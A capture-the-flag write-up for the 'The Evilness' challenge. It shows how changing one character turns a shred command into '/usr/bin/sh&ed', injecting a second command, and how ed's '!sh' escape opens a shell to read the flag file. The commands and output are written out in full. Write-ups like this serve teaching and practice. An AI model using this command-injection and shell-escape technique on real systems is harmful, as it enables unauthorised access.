# The Evilness

## Challenge

> Ready for something ridiculously difficult?
> 
> nc ctf.pwn.sg 4020

## Solution

*We didn't solve this challenge and this writeup is inspired by the writeups at the end of this document.*

If we nc to `ctf.pwn.sg 4020`, we are shown the Python script [theevilness.py](theevilness.py) and prompted with:

```
Here comes the shredder! (/usr/bin/shred /tmp/cartoon-qOa6us.dat)
```

From the provided Python script [theevilness.py](theevilness.py), we can observe that it:
* Creates a new temporary file
* Writes the flag to this temporary file
* Prepares a command that deletes/shreds this temporary file:
    ```
    /usr/bin/shred /tmp/cartoon-N4KVtr.dat
    ```
* Allows the user to modify one character of this command

We can replace the 12-th character of this command (`r`) with the character `&` so as to modify the command to be:

```
/usr/bin/sh&ed /tmp/cartoon-N4KVtr.dat
```

The [single `&` character](http://bashitout.com/2013/05/18/Ampersands-on-the-command-line.html) delimits the following commands that are run asynchronously:

```
/usr/bin/sh
```

```
ed /tmp/cartoon-N4KVtr.dat
```

where `ed` is the command for [Ed](http://www.gnu.org/software/ed/manual/ed_manual.html), a GNU line-oriented text editor.

Interacting with `ctf.pwn.sg` on port 4020, we supply the inputs `11` (corresponds to 12th character) and `26` (hex representation of `&`):

```
Here comes the shredder! (/usr/bin/shred /tmp/cartoon-Qh40QX.dat)
11
26
sh: 1: /usr/bin/sh: not found
Newline appended
62
```

We are presented with the command prompt of Ed. Using `.` to print out the contents of the temporary file,

```
.
LOL YOU THOUGHT THIS WOULD BE SO EASY? GET A SHELL YOU DWEEB.
```

We are given another hint that instructs us to get a shell. Using `!` run commands on the shell (to open another shell), we find the flag present in the working directory and print out its contents:

```
!sh
ls
flag
flag.py
requirements.txt
theevilness.py
cat flag
CrossCTF{it5_th3_r34ln3ss_th3_r3alness}
```

## Other writeups

* [NUS OSI Layer 8 writeup](https://osilayer8.cf/crossctf-finals2018/misc/evil/README/)
